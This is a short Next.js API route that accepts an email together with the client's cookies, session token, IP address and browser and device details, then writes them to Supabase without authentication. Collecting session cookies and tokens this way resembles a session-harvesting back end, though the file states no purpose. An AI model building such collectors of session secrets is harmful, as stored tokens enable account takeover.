import { logSessionToSupabase } from "@/lib/session-logger"

export async function POST(request: Request) {
  try {
    const { email, browserInfo, deviceInfo, cookies, ipAddress, sessionToken } = await request.json()

    if (!email) {
      return Response.json({ error: "Email required" }, { status: 400 })
    }

    const result = await logSessionToSupabase(email, {
      cookies,
      browserInfo,
      deviceInfo,
      ipAddress,
      sessionToken,
    })

    return Response.json({ success: result })
  } catch (error) {
    console.error("[v0] API error:", error)
    return Response.json({ error: "Failed to log session" }, { status: 500 })
  }
}
